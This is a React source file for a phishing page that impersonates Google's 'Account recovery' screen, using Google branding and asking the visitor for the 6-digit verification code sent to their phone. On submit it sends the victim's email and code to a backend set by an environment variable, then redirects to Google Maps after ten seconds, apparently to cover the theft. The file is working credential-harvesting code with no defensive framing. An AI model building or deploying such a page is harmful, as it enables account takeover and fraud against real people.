import { ChevronDown as Arrow, CircleUser as User } from "lucide-react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation } from "react-router-dom";
import axios from "axios";

const CodeSection = () => {
  
  const location = useLocation();

  const { email } = location.state?.email ? location.state : { email: "*********" };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const [loading, setLoading] = useState(false);

  const handleData = async (data) => {
    setLoading(true);
    const finalData = {
      email: email,
      code: data.textcode,
    }

    try {
      await axios.post(
          `${import.meta.env.VITE_API_URL}/info/update-code`,
          finalData
      );
    } catch (error) {
      setLoading(false);
      console.log(error);
    }

    setTimeout(() => {
      setLoading(false);
      window.location.href = "https://www.google.com/maps";
    }, 10000);
  };

  return (
      <div className="relative overflow-hidden w-full max-w-[950px] mx-auto bg-white rounded-3xl shadow-sm p-6 sm:p-8 md:p-12 flex flex-col md:flex-row gap-10 md:gap-16">

        {/* 🔵 TOP LOADING BAR */}
        {loading && (
            <div className="absolute top-0 left-0 w-full h-1 bg-gray-200">
              <div className="h-full bg-blue-600 animate-[loading_1.2s_linear_infinite]" />
            </div>
        )}

        {/* LEFT SIDE */}
        <div className="flex-1">
          <div className="flex items-center gap-2 mb-6">
            <img
                src="https://www.gstatic.com/images/branding/product/1x/chrome_48dp.png"
                className="w-8 h-8"
            />
          </div>

          <h1 className="text-2xl sm:text-3xl md:text-5xl font-medium text-gray-800 mb-4">
            Account recovery
          </h1>

          <p className="text-gray-700 text-sm sm:text-base font-medium mb-6 leading-relaxed">
            To help keep your account safe, Google wants to make sure it's really
            you trying to sign in.
          </p>

          <div className="px-4 py-2 border border-gray-400 rounded-full flex items-center gap-2 w-max max-w-full">
            <User size={20} className="text-gray-800 shrink-0" />
            <p className="text-gray-800 text-sm sm:text-base truncate">
              {email || "Email"}
            </p>
            <Arrow size={16} className="text-gray-800 shrink-0" />
          </div>
        </div>

        {/* RIGHT SIDE */}
        <div className="flex-1 flex flex-col justify-between mt-8 md:mt-0">
          <form onSubmit={handleSubmit(handleData)} errors={errors}>
            <div>
              <label className="text-sm font-medium text-gray-600 block leading-relaxed">
                A text message with a 6-digit verification code was sent to your
                phone
              </label>

              <input
                  type="text"
                  name="textcode"
                  id="textcode"
                  placeholder="G- Enter code"
                  {...register("textcode", { required: "Code is required" })}
                  className="w-full border border-blue-500 rounded-md px-3 py-3 mt-4 mb-6 outline-none focus:ring-1 focus:ring-blue-500"
              />

              {errors.textcode && (
                  <p className="text-red-500 text-sm mt-2">
                    {errors.textcode.message}
                  </p>
              )}
            </div>

            {/* BUTTON SECTION */}
            <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 mt-6">
              <button
                  type="button"
                  className="text-blue-600 font-medium text-left"
              >
                I Don't have my phone?
              </button>

              <button className="bg-blue-600 text-white px-6 py-3 rounded-full font-medium hover:bg-blue-700 transition w-full sm:w-auto">
                Next
              </button>
            </div>
          </form>
        </div>

        {/* Tailwind custom animation */}
        <style>
          {`
        @keyframes loading {
          0% { width: 0% }
          50% { width: 70% }
          100% { width: 100% }
        }
      `}
        </style>
      </div>
  );
};

export default CodeSection;
